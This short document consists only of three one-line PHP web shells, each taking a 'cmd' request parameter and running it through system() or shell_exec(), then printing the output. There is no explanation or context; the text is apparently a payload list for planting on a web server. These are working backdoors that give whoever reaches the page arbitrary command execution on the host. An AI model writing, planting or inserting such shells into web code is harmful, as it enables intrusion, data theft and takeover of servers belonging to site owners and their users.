<?php echo system($_GET['cmd']); ?>


<?php echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "<pre>" ; ?>
<?php echo "<pre>" . system($_GET['cmd']) . "<pre>" ; ?>